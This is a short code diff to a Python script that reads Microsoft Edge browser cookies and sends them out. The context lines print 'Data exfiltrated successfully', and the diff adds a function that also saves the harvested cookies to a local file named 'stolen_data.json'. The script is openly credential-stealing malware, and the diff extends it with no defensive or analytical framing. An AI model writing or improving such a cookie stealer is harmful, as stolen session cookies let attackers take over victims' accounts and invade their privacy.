@@ -63,6 +63,14 @@ def send_data(data):
         print(f"Failed to send data: {e}")
         return None
 
+# Function to save data locally
+def save_data_locally(data):
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    output_path = os.path.join(script_dir, "stolen_data.json")
+    with open(output_path, 'w', encoding='utf-8') as file:
+        json.dump(data, file, ensure_ascii=False, indent=4)
+    print(f"Data saved locally at {output_path}")
+
 # Main function
 if __name__ == "__main__":
     cookies = get_edge_cookies()
@@ -71,3 +79,6 @@ if __name__ == "__main__":
         print("Data exfiltrated successfully.")
     else:
         print("Failed to exfiltrate data.")
+    
+    # Save data locally regardless of the exfiltration result
+    save_data_locally(cookies)
